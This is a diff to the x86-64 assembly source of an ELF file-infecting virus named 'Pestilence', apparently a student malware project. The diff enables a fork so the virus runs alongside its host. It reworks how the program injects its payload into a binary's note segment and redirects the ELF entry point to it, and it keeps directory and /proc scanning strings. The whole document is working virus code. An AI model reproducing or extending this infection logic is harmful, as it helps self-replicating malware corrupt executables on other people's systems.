@@ -5,10 +5,10 @@ section .text
 
 _start:
 		; Fork process => Parent resumes host activity while Child does virus stuff
-;		mov rax, SYSCALL_FORK
-;		syscall
-;		cmp rax, 0
-;		jnz jumpToHost
+		mov rax, SYSCALL_FORK
+		syscall
+		cmp rax, 0
+		jnz jumpToHost
 
 		; Save common registers
 		push rdi
@@ -262,7 +262,6 @@ isElf64:
 injectVirus:
 		push r8
 		push r9
-		push r10
 
 		; Save File Mapping in R8
 		mov r8, rdi
@@ -303,11 +302,10 @@ injectVirus:
 		mov VALUE(s_pestilence.file_data), rax
 		mov r8, rax
 
-.getELFHeadersInfo:
-		mov rax, r8
-		movzx rcx, word [rax + elf64_ehdr.e_phnum]
-		mov rdi, qword [rax + elf64_ehdr.e_phoff]
-		add rdi, rax
+.getProgramHeaderInfo:
+		movzx rcx, word [r8 + elf64_ehdr.e_phnum]
+		mov rdi, qword [r8 + elf64_ehdr.e_phoff]
+		add rdi, r8
 
 ; RDI => Program Header
 .findNoteSegment:
@@ -350,22 +348,27 @@ injectVirus:
 
 ; R9 => Note segment Program header
 .patchELFHeader:
-		add qword VALUE(s_pestilence.file_size), PAGE_SIZE
-
+		; RDI => Far end of payload
 		mov rdi, r8
 		add rdi, VALUE(s_pestilence.file_size)
+		add rdi, PAYLOAD_SIZE
 
+		; Edit `payloadEntry`
 		mov rsi, [r9 + elf64_phdr.p_offset]
+		add rsi, 0xc000000
 		mov qword [rdi - 16], rsi
 
+		; Edit `hostEntry`
 		mov rax, [r8 + elf64_ehdr.e_entry]
 		mov qword [rdi - 8], rax
 
-		; Edit file entry to payload start
+		; Edit file entry to payload start (virtual address)
 		mov qword [r8 + elf64_ehdr.e_entry], rsi
 
+		; Adjust file sizes
+		add qword VALUE(s_pestilence.file_size), PAGE_SIZE
+
 .return:
-		pop r10
 		pop r9
 		pop r8
 		ret
@@ -574,8 +577,8 @@ ft_memmem:
 		ret
 
 data:
-	infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
 	signature: db "Pestilence v1.0 (c)oded by tblaudez", 0
+	infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
 	processDirectory: db "/proc/", 0
 	processStatFile: db "/stat", 0
 	daemonName: db "(daemon)", 0
